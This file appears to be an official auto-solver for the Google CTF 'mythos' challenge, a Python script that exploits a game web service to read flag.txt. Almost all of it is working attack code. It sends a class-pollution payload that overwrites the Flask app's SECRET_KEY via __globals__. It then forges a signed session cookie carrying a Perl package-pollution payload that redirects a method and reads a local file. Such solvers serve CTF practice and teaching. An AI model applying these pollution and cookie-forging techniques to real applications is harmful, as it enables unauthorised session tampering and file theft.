# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import json
from base64 import b64decode
import argparse
from itsdangerous import (
    base64_decode,
    URLSafeTimedSerializer,
    TimestampSigner,
)
import hashlib
import zlib
from flask.json.tag import TaggedJSONSerializer

SECRET_KEY = "viewie"
PERL_PACKAGE_POLLUTION = {
    "UNIVERSAL": {"can": "item_delegate"},
    "desc_filename": "./flag.txt",
}


def sign_session(val):
    return URLSafeTimedSerializer(
        secret_key=SECRET_KEY,
        salt="cookie-session",
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},
    ).dumps(val)


def decode(value):
    try:
        compressed = False
        payload = value
        if payload.startswith("."):
            compressed = True
            payload = payload[1:]
        data = payload.split(".")[0]
        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)
        data = data.decode("utf-8")

    except Exception as e:
        print(e)

    def hook(obj):
        if len(obj) != 1:
            return obj
        key, val = next(iter(obj.items()))
        if key == " t":
            return tuple(val)
        elif key == " b":
            return b64decode(val)
        return obj

    try:
        return json.loads(data, object_hook=hook)

    except json.JSONDecodeError as e:
        print(e)
        return {"error": e}


def perl_exploit(s, u):
    print("[*] COOKIE, SIGNED: {}\n".format(s.cookies["session"]))
    print("[*] COOKIE, DECODED: {}\n".format(decode(s.cookies["session"])))
    payload = {
        "items": json.dumps(PERL_PACKAGE_POLLUTION).encode(),
        "game": decode(s.cookies["session"])["game"],
    }
    session = sign_session(payload)
    print("[*] BAD COOKIE, SIGNED: {}\n".format(session))
    print("[*] BAD COOKIE, DECODED: {}\n".format(decode(session)))
    r = requests.post(u + "/play", cookies={"session": session}, json={"choice": 0})
    return decode(r.cookies["session"])


def play_game(s, u):
    s.get(u)
    for _ in range(4):
        s.post(u + "/play", json={"choice": 0})


def python_exploit(s, u):
    PYTHON_CLASS_POLLUTION = {
        "__init__": {
            "__globals__": {"app": {"config": {"SECRET_KEY": "{}".format(SECRET_KEY)}}}
        }
    }
    s.post(u + "/score", json=PYTHON_CLASS_POLLUTION)


def pwn(u):
    s = requests.Session()
    play_game(s, u)
    python_exploit(s, u)
    flag = perl_exploit(s, u)
    print("[FLAG!] Flag:{}".format(flag["game"]["items"]["desc"]))
    return flag


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="MYTHOS Solver", description="Autosolve gctf mythos challenge"
    )
    parser.add_argument("-r", "--remote")
    args = parser.parse_args()
    CHALL_URL = "http://localhost:1338"
    if args.remote:
        CHALL_URL = args.remote
    pwn(CHALL_URL)
